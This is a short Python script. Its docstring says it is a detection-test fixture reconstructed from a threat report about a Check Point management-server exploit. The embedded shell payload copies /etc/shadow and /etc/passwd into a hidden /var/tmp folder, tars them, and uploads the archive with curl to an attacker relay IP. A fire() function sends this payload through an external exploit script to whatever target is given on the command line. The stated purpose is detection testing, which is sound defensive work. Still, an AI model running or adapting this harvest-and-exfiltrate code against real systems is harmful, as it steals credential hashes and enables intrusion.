#!/usr/bin/env python3
"""Synthesized detection-test fixture, reconstructed from GreyNoise's GT13 report.

Represents the attacker's post-exploitation harvest script run (via the
CVE-2026-16232 Check Point SmartConsole auth-bypass RCE) against a compromised
Security Management Server: it stages copies of the firewall's SIC/CA material
and password database into a hidden /var/tmp directory, archives them, and
pushes the archive out over HTTP to an attacker-controlled relay.
"""
import subprocess
import sys

HARVEST = r'''R=/var/tmp/.x4f2a
mkdir -p $R
cd $R
cp /etc/shadow /etc/passwd $R/ 2>/dev/null
hostname > $R/host.txt
tar -czf /var/tmp/.x4f2a.tgz -C /var/tmp .x4f2a 2>/dev/null
curl -s -m 25 -X POST http://198.51.100.9:8899/x4f2a.tgz -T /var/tmp/.x4f2a.tgz 2>/dev/null
echo PUSHED
'''


def fire(ip, cmd):
    args = [sys.executable, "/root/exfil/exploit_socks.py",
            "--target", ip, "--fwm-port", "18190", "--cpm-port", "19009",
            "--timeout", "30", "--cmd", cmd]
    return subprocess.run(args, capture_output=True, text=True, timeout=120).stdout


if __name__ == "__main__":
    print(fire(sys.argv[1], HARVEST))
